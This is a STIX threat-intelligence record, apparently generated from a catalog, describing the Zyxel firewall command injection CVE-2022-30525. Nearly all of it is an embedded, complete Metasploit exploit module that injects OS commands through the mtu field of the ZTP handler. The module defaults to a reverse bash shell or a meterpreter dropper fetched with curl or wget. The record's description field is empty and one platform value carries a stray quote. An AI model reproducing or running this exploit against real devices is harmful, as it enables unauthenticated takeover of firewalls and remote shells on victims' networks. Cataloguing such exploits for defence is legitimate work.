{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35a90f20-9db1-4e3d-8c17-1938959eba26",
    "created": "2024-08-14T17:00:04.601243Z",
    "modified": "2024-08-14T17:00:04.601247Z",
    "name": "Zyxel Firewall ZTP Unauthenticated Command Injection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/zyxel_ztp_rce.rb",
            "external_id": "zyxel_ztp_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-30525"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zyxel Firewall ZTP Unauthenticated Command Injection',\n        'Description' => %q{\n          This module exploits CVE-2022-30525, an unauthenticated remote\n          command injection vulnerability affecting Zyxel firewalls with zero\n          touch provisioning (ZTP) support. By sending a malicious setWanPortSt\n          command containing an mtu field with a crafted OS command to the\n          /ztp/cgi-bin/handler page, an attacker can gain remote command execution\n          as the nobody user.\n\n          Affected Zyxel models are:\n\n          * USG FLEX 50, 50W, 100W, 200, 500, 700 using firmware 5.21 and below\n          * USG20-VPN and USG20W-VPN using firmware 5.21 and below\n          * ATP 100, 200, 500, 700, 800 using firmware 5.21 and below\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2022-30525' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/']\n        ],\n        'DisclosureDate' => '2022-04-28',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_MIPS64,],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Shell Dropper',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_MIPS64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'wget' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mips64/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  # Checks the build date that is embedded in the landing page. If it finds a build\n  # date older than April 20, 2022 then it will additionally check if the model is\n  # a USG FLEX, USG20[w]?-VPN, or an ATP system. Command execution is blind so this\n  # seems like a reasonable approach.\n  def check\n    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/'))\n    unless res\n      return CheckCode::Unknown('The target failed to respond to check.')\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe('Failed to retrieve /')\n    end\n\n    ver = res.body[/favicon\\.ico\\?v=(?<build_date>[0-9]{6,})/, :build_date]\n    if ver.nil?\n      return CheckCode::Safe('Could not extract a version number')\n    end\n\n    if ver[0..5].to_i < 220420\n      model = res.get_html_document.xpath('//title').text\n      if model.include?('USG FLEX') || model.include?('ATP') || (model.include?('USG20') && model.include?('-VPN'))\n        return CheckCode::Appears(\"This was determined by the model and build date: #{model}, #{ver}\")\n      end\n    end\n\n    CheckCode::Safe(\"This determination is based on the build date string: #{ver}.\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    handler_uri = normalize_uri(target_uri.path, '/ztp/cgi-bin/handler')\n    print_status(\"Sending command to #{handler_uri}\")\n\n    # this is the POST data. exploit goes into the mtu field. technically, `data` is a usable vector too\n    # but it's more involved.\n    http_payload = {\n      'command' => 'setWanPortSt',\n      'proto' => 'dhcp',\n      'port' => Rex::Text.rand_text_numeric(4).to_s,\n      'vlan_tagged' => Rex::Text.rand_text_numeric(4).to_s,\n      'vlanid' => Rex::Text.rand_text_numeric(4).to_s,\n      'mtu' => \";#{cmd};\",\n      'data' => ''\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => handler_uri,\n      'headers' =>\n      {\n        'Content-Type' => 'application/json; charset=utf-8'\n      },\n      'data' => http_payload.to_json\n    })\n    # Successful exploitation can result in no response (connection being held open by a reverse shell)\n    # or, if the command executes immediately, a response with a 503.\n    if res && res.code != 503\n      fail_with(Failure::UnexpectedReply, \"The target replied with HTTP status #{res.code}. No reply was expected.\")\n    end\n    print_good('Command successfully executed.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-04-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}